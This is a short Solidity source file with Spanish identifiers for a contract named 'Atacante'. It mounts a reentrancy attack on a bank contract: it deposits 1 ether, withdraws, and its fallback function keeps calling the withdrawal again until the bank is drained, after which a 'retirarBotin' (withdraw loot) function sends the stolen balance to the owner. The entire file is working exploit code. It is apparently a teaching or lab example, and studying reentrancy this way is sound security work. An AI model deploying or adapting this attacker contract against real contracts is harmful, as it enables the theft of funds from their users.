// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBanco {
    function depositar() external payable;
    function retirar() external;
}

contract Atacante {
    IBanco public banco;
    address public owner;

    constructor(address _banco) {
        banco = IBanco(_banco);
        owner = msg.sender;
    }

    function atacar() external payable {
        require(msg.value >= 1 ether, "Envia al menos 1 ETH");
        banco.depositar{value: 1 ether}();
        banco.retirar();
    }

    receive() external payable {
        if (address(banco).balance >= 1 ether) {
            banco.retirar();
        }
    }

    function retirarBotin() external {
        payable(owner).transfer(address(this).balance);
    }
}
